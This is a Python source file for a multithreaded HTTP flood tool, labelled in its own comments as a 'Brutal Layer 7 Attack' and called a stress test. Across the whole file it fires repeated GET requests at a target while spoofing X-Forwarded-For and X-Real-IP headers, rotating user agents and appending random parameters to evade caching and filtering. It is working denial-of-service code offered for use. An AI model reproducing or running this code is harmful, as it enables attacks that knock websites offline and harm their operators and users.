import requests
import threading
import time
import random
import secrets

# * Nitro Stress Engine v5.0 (Brutal Layer 7 Attack)
class StressEngine:
    def __init__(self):
        self.isFlooding = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
        ]

    # * Jalankan serangan Layer 7 (HTTP Flood dengan Bypass)
    def runBrutalStress(self, target, threads=50, duration=30):
        self.isFlooding = True
        
        def worker():
            session = requests.Session()
            end_time = time.time() + duration
            while time.time() < end_time and self.isFlooding:
                try:
                    # -- Dynamic Bypass --
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    cache_buster = secrets.token_hex(4)
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'X-Forwarded-For': fake_ip,
                        'X-Real-IP': fake_ip,
                        'Cache-Control': 'no-cache',
                        'Referer': f'https://www.google.com/search?q={cache_buster}'
                    }
                    
                    # * Injeksi parameter acak buat bypass cloud cache
                    conn = '&' if '?' in target else '?'
                    attack_url = f"{target}{conn}nitro={cache_buster}"
                    
                    session.get(attack_url, headers=headers, timeout=2)
                except Exception:
                    pass
            session.close()

        # * Launch threads selevel Kali Linux
        for _ in range(threads):
            threading.Thread(target=worker, daemon=True).start()
            
        return f"ALHAMDULILLAH! Stress test started on {target} ({threads} threads) for {duration}s."

    def stop(self):
        self.isFlooding = False
        return "Stress test halted."
